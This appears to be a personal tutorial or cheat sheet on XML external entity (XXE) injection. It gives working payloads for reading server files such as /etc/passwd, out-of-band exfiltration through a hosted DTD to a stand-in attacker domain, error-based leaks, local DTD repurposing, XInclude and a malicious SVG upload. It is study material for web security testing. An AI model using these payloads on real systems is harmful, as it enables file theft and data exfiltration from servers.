# XML external entity (XXE) injection
> Utkarsh Yadav | June 23rd  2020
---

## Intro
Websites using XML for various purpose
When we are able to make the application process xml data provided by us we can 
do some of the following

* Read files stored on server
* Fetch a remote resourse
* Access the internals of the said application
* SSRF ?
* OOB (out of band data transfer)
* Execute system command()?



#### What are XML entities? 
> Entities `&lt;` and `&gt;` represent the characters < and >.
These are metacharacters used to denote XML tags, and so must generally be 
represented using their entities when they appear within data.  
[Source](https://portswigger.net/web-security/xxe/xml-entities)

##### Using Entities
* Custom entities can be defined as follows
  > ```xml
  >     <!DOCTYPE foo [ <!ENTITY entity "hackMe" > ]>
  > ```
  >  Now every instance of `&entity;` will be reloaced by `hackMe`  
  > `<data> &entity </data>`  will become `<data> hackme </data>`
##### External Entities
* External entities are very similar the only difference is instead of defining
the value of entity we specify a URL and the value is fetched from that URL
  - Fetching a URL
    > ```xml
    > <!DOCTYPE foo [ <!ENTITY ext SYSTEM "https://example.com/" > ]>
    > ```
  - Fetching a Local file
    > ```xml
    > <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
    > ```
Similarly other protocols can be used to access any other resources()?


#### Blind XXE
When an application is vulnerable to xxe but it's response don't reflect the 
xxe output. In such casses there are two ways
  * Causing an error and checking if we can get any xxe reflection in error
  * Out of band exfiltratoin 
    > we can make the server make a remote request to a domain that we control
    and hide the output of an xxe inside the request. eg inside subdomain,URL,
    querry parameter
    - Example  
    You can put the XXE in place of the following **injection-point**
      > http://**injection-point**.ourexampledomain.com/**injection-point**/?**injection-point**  
      
      On your server you can use nc to listen on the port for incomming connection

#### XML Parameter Entities
They are special kind of Entities that can only be refferenced within DTD(inside <!DOCTYPE >)
They can be used to recive an Out-of-band reuests. These are specially useful when
using xxe inside the document is restricted.

* Example
  >  ```xml
  >  <!DOCTYPE foo [<!ENTITY % xxevar "xxe value">] %xxevar;>
  > ```
* The below example will alone issue a request to our domain
  > ```xml
  > <!DOCTYPE foo [ <!ENTITY % xxevar SYSTEM "http://ourexampledomain.com/" > %xxevar; ]>
  > 

#### Out-of-band Data Exfiltration
We know that XML parameter entities can be used in DTD we can use this feature to 
exfiltrate data easilt
* You need to host this file somewhere say (http://ourexampledomain.com/hack.dtd)
  > ```xml
  > <!ENTITY % file SYSTEM "file:///etc/passwd">
  > <!ENTITY % eval "<!ENTITY &#x25; request SYSTEM 'http://ourexampledomain.com/?q=%file;'>">
  > %eval;
  > %request;
  > ```

  > **Note:** We need to host this file externally because XML specification
  don't allow to use xml paramete entities in definition of other XML parameter
  entities unless they comes from some external source()?
The Above code does the following
- Load the contents of `/etc/passwd` in XML parameter entity `file` 
- Then it makes a special parameter entities `eval`
  > this `eval` entity  when called will create another parameter entity
- This new entity will include the contents from `file` entity as a HTTP GET parameter of a URL
- This newly created entity when called issues a request to the said URL.
- The contents of the file are sent to the URL as GET parameter


Now Inject the following inside the XML
  > ```xml
  > <?xml version="1.0" encoding="UTF-8"?>
  > <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
  > "https://ourexampledomain.com/hack.dtd"> %xxe;]>
  > ```

- This will fetch dtd file from https://ourexampledomain.com/hack.dtd and execute it  

**Note:** Sometimes it's not possible to fetch multiline files as a get paramete
The following are some ways you can circumvent this behaviour
  - Try replacing the protocol with other protocols for example `ftp`,`git`,`gopher` etc
  - One other way is if the server supports `php` as protocol then we can use php filter
  to get a one line response from multiline files
    > php://filter/convert.base64-encode/resource=/etc/passwd
#### ERROR based exfiltration
If output of your injection isn't working and out of band request is not the option
you can try error based exfiltration a sample DTD is below
  > ```xml
  > <!ENTITY % file SYSTEM "file:///etc/passwd">
  > <!ENTITY % ell "<!ENTITY &#x25; error SYSTEM 'file:///e/%file;'>">
  > %ell;
  > %error;
  > ```

#### Repurposing a local DTD
Although XML specification don't allow to use xml paramete entities in definition
of other XML parameter entities but this restriction is released if we are redefining
XML parameter entities already defined inside an external DTD


This mean if we can find any local dtd with XML parameter entity we can load 
it into our payload and redefine that parameter entity.

Now this eliminates our need to host our XML dtd file. Now this is very useful
in case 
 - ##### If You Dont Want to Host Your dtd and want to leak server data out-of-bandf

 -  All external requests are blocked, in such conditions we can try to leak server data in error messages
  > **Example**
  > ```xml
  > <!DOCTYPE foo [
  > <!ENTITY % exec SYSTEM "file://<path to dtd>">
  > <!ENTITY % <some entity in given dtd> '
  > <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  > <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  > &#x25;eval;
  > &#x25;error;
  > '>
  > %exec;
  > ]>
  > ```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; magic SYSTEM &#x27;file:///we/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;magic;
'>
%dtd;
]>
```


#### Using Xinclude where we don't control the entire document
The following injection at any point in data section of an XML document will 
result in spiting out the `/etc/passwd` file
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

#### XML file upload
XML can also be embeded inside some file types eg `docx`,`pdf`,`svg`etc 
if we inject xxe inside these it is possible that in some point of time we 
might get our xml interpreted.

##### Example
Consider a sever accepts an svg file as avatar and then convert it to png
it might execute our xml payload as well.The sample svg code below adds the
hostname inside the image when processed
```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 105">
  <g fill="#97C024" stroke="#97C024" stroke-linejoin="round" stroke-linecap="round">
    <path d="M14,40v24M81,40v24M38,68v24M57,68v24M28,42v31h39v-31z" stroke-width="12"/>
    <path d="M32,5l5,10M64,5l-6,10 " stroke-width="2"/>
  </g>
  <path d="M22,35h51v10h-51zM22,33c0-31,51-31,51,0" fill="#97C024"/>
  <g fill="#FFF">
    <circle cx="36" cy="22" r="2"/>
    <circle cx="59" cy="22" r="2"/>
  </g>
<text font-size="10" x="0" y="16">&xxe;</text>
</svg>
```


#### Content type
Try changing the content type of a request to see if the server accepts if it
does there are chances of XXE


For example, if a normal request contains the following:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Then you might be able submit the following request, with the same result:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### USEFUL INFORMATION

Sometimes `SYSTEM` is dissabled from being used in DTD in those cases we can use
`PUBLIC`
